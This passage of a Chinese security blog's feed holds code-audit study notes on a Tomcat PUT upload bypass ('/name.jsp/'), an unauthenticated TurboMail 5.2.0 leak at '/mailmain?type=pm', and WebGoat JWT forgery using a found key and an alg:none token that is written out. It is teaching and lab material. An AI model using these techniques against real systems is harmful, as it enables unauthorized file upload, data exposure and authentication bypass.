function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dest <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dest<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>is<span class="token punctuation">,</span> dest<span class="token punctuation">.</span><span class="token function">toPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CopyOption</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">StandardCopyOption</span><span class="token punctuation">.</span>REPLACE_EXISTING<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>is<span class="token punctuation">,</span> dest<span class="token punctuation">.</span><span class="token function">toPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CopyOption</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行到<code>dest = this.file(path.substring(webAppMount.length()), false); </code> 时，path 会作为参数传入，执行 file 方法，file 方法部分代码如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">File</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> mustExist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        name <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>fileBase<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行到 <code>File file = new File(this.fileBase, name); </code>时，会实例化一个 File 对象，fileBase 是 Web 应用所在的绝对路径。</p><p>这里的 name 就是传入的文件名，比如 /teamssix.jsp/，在 File 实例化的过程中会处理掉 /，因此 /teamssix.jsp/ 会变成  /teamssix.jsp</p><p>所以通过 PUT 请求，利用 /teamssix.jsp/ 可以达到任意文件上传的目的。</p><blockquote><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/5610">https://xz.aliyun.com/t/5610</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-环境搭建&quot;&gt;&lt;a href=&quot;#0x00-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x00 环境搭建&quot;&gt;&lt;/a&gt;0x00 环境搭建&lt;/h1&gt;&lt;p&gt;直接 Docker 搭建即可&lt;/p&gt;
&lt;pre class=&quot;line-number</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】敏感信息泄露</title>
    <link href="https://www.teamssix.com/211215-131111.html"/>
    <id>https://www.teamssix.com/211215-131111.html</id>
    <published>2021-12-15T05:11:11.000Z</published>
    <updated>2021-12-15T05:57:22.590Z</updated>
    
    <content type="html"><![CDATA[<p>这里以 TurboMail 5.2.0 里的敏感信息泄露漏洞作为学习。</p><p>已知 TurboMail 5.2.0 的敏感信息泄露路径为 /mailmain?type=pm</p><p>打开 TurboMail 的安装目录，在 turbomail\web\webapps\ROOT\WEB-INF 下找到 web.xml 文件，发现以下配置信息</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>mailmaini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/mailmain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>mailmaini<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>turbomail.web.MailMain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>从这些配置信息不难看出 /mailmain 路径对应的 servlet-name 是 mailmaini，而 mailmaini 对应的 servlet-class 是 turbomail.web.MailMain</p><p>那么这里就需要找到 turbomail.web.MailMain 类进行分析，假设这个类是在 turbomail.jar 文件里，通过搜索在 /turbomail/web/webapps/ROOT/WEB-INF/lib/ 下找到 turbomail.jar 文件</p><p>利用 jd-gui 或者 Intellij IDEA 对 turbomail.jar 进行反编译，可以在 turbomail/web/ 文件夹内找到 MailMain.java 文件，这说明之前的假设是正确的。</p><p>在 195 行可以看到接收了 type 参数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">195</span>  <span class="token class-name">String</span> type <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">196</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">197</span>      type <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token number">198</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 543 行可以看到如果 type 参数为 pm，则执行 PMAdmin 的 show 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">543</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"pm"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token number">544</span>     <span class="token class-name">PMAdmin</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看该方法的代码，可以看到并没有对用户身份进行验证</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> bAjax<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PMInterface</span> pm <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> alPM<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pm <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PMInterface</span><span class="token punctuation">)</span>alPM<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>pm<span class="token punctuation">.</span><span class="token function">PM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">String</span> str <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">SysConts<span class="token punctuation">.</span>New_InCharSet</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此直接访问 /mailmain?type=pm 就可以看到已登录的用户邮箱信息。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112151310177.png"></p><p>这个地方除了泄露登录用户邮箱外，type 后面跟上不同的参数还会泄露邮箱用户列表以及对管理员密码重置等，读者可以自己尝试去发现发现。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里以 TurboMail 5.2.0 里的敏感信息泄露漏洞作为学习。&lt;/p&gt;
&lt;p&gt;已知 TurboMail 5.2.0 的敏感信息泄露路径为 /mailmain?type=pm&lt;/p&gt;
&lt;p&gt;打开 TurboMail 的安装目录，在 turbomail\web\weba</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】JWT Token</title>
    <link href="https://www.teamssix.com/211214-175948.html"/>
    <id>https://www.teamssix.com/211214-175948.html</id>
    <published>2021-12-14T09:59:48.000Z</published>
    <updated>2021-12-14T11:07:43.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>JSON Web Token 缩写成 JWT，被用于和服务器的认证场景中，这一点有点类似于 Cookie 里的 Session id，关于这两者的区别可以看本文尾部的参考链接。</p><p>JWT 由三部分构成，分别为 Header（头部）、Payload（负载）、Signature（签名），三者以小数点分割，格式类似于这样：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">Header.Payload.Signature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实际遇到的 JWT 一般是这种样子</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>JWT 的第一部分 Header 通常由两个部分组成：</strong></p><ul><li>alg 表示使用的签名算法，例如 RSA、HMAC SHA256（或简写为 HS256）</li><li>typ 表示 Token 的类型 Type</li></ul><p>通常写成以下 JSON 格式 的样子</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>  <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用 Base64URL 编码为 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9，就形成了 JWT 的第一部分。</p><p><strong>JWT 的第二部分 Payload  也是 JSON 的格式，例如：</strong></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"sub"</span><span class="token operator">:</span> <span class="token string">"1234567890"</span><span class="token punctuation">,</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"John Doe"</span><span class="token punctuation">,</span>  <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1516239022</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后将该 JSON 对象进行 Base64URL 编码为 eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ，就形成了 JWT 的第二部分。</p><p>对于 Payload 官方规定了 7 个字段：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">iss (issuer)：签发人exp (expiration time)：过期时间sub (subject)：主题aud (audience)：受众nbf (Not Before)：生效时间iat (Issued At)：签发时间jti (JWT ID)：编号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除此之外，也是可以定义私有字段的。</p><p><strong>JWT 的第三部分 Signature 是对 Header 和 Payload 部分的签名，起到防止数据篡改的作用。</strong></p><p>首先需要指定一个密钥，这个密钥只有服务器知道，然后利用 Header 里指定的加密算法（默认是 HMAC SHA256）按照下面的公式生成签名。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),secret)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x01-靶场复现"><a href="#0x01-靶场复现" class="headerlink" title="0x01 靶场复现"></a>0x01 靶场复现</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这里使用 WebGoat 靶场进行 JWT Token 实验，直接 Docker 搭建即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker pull webgoat/goatandwolf<span class="token function">sudo</span> docker run -p <span class="token number">8080</span>:8080 -p <span class="token number">9090</span>:9090 -e <span class="token assign-left variable">TZ</span><span class="token operator">=</span>Europe/Amsterdam -d webgoat/goatandwolf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开之后，来到 (A2) Broken Authentication 找到 JWT Token 的第 5 关，可以看到这一关是需要修改 JWT Token 的值以 admin 身份进行投票重置，那么需要先找到 JWT 的加密密钥。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112141758858.png"></p><p>在点击重置投票按钮时，请求的 URL 为 <a href="http://172.16.214.20:8080/WebGoat/JWT/votings">http://172.16.214.20:8080/WebGoat/JWT/votings</a></p><p>Clone 源码到本地，看看在源码里能否找到什么有价值的信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/WebGoat/WebGoat.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接在代码里全局搜索 /JWT/votings</p><p>在 webgoat-lessons/jwt/src/main/java/org/owasp/webgoat/jwt/JWTVotesEndpoint.java 的第 163 行找到 @PostMapping(“/JWT/votings”)，通过函数名 resetVotes() 判断大概率是进行重置投票的函数。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/JWT/votings"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">AttackResult</span> <span class="token function">resetVotes</span><span class="token punctuation">(</span><span class="token annotation punctuation">@CookieValue</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"access_token"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> accessToken<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>accessToken<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-invalid-token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Jwt</span> jwt <span class="token operator">=</span> <span class="token class-name">Jwts</span><span class="token punctuation">.</span><span class="token function">parser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSigningKey</span><span class="token punctuation">(</span>JWT_PASSWORD<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>accessToken<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Claims</span> claims <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Claims</span><span class="token punctuation">)</span> jwt<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> isAdmin <span class="token operator">=</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> claims<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isAdmin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-only-admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                votes<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>vote <span class="token operator">-></span> vote<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JwtException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">failed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">feedback</span><span class="token punctuation">(</span><span class="token string">"jwt-invalid-token"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过分析代码，从上面代码的第 8 行中不难看出 JWT 的密码为 JWT_PASSWORD 变量，当 Cookie 中的 access_token 参数里的 Payload 部分（即上面代码里的第 10 行 claims.get）的 admin 参数值为 true 时则判断为 admin 用户，如果为 false 则返回 jwt-only-admin</p><p>通过在代码里查询 JWT_PASSWORD 变量，可以找到值为 victory</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JWTVotesEndpoint</span> <span class="token keyword">extends</span> <span class="token class-name">AssignmentEndpoint</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> JWT_PASSWORD <span class="token operator">=</span> <span class="token class-name">TextCodec</span><span class="token punctuation">.</span>BASE64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">"victory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> validUsers <span class="token operator">=</span> <span class="token string">"TomJerrySylvester"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>知道了 jwt 密钥之后，在 <a href="https://jwt.io/">jwt.io</a> 上将 Payload 部分的 admin 值修改为 true ，在 Signature 部分添加密钥重新生成 JWT，然后 Burp 替换就可以成功重置投票了。</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>除了以上通过源码找 JWT 密钥的方法还可以利用将加密算法修改为 none，即通过不加密的方式进行绕过。</p><p>{“alg”:”none”} 编码后为 eyJhbGciOiJub25lIn0=，将 Payload 里的 admin 值修改为 true，最终构造 Token 如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">eyJhbGciOiJub25lIn0<span class="token operator">%</span><span class="token number">3d</span><span class="token punctuation">.</span>eyJpYXQiOjE2NDAzMTg4NTEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/ittranslator/p/14595165.html">https://www.cnblogs.com/ittranslator/p/14595165.html</a></p><p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p><p>原文链接：</p><p><a href="https://www.teamssix.com/211214-175948.html">https://www.teamssix.com/211214-175948.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;JSON Web Token 缩写成 JWT，被用于和服务器的认证场景中，这一点有点类似于 Cook</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】模板注入</title>
    <link href="https://www.teamssix.com/211203-200441.html"/>
    <id>https://www.teamssix.com/211203-200441.html</id>
    <published>2021-12-03T12:04:41.000Z</published>
    <updated>2021-12-03T12:16:44.226Z</updated>
    
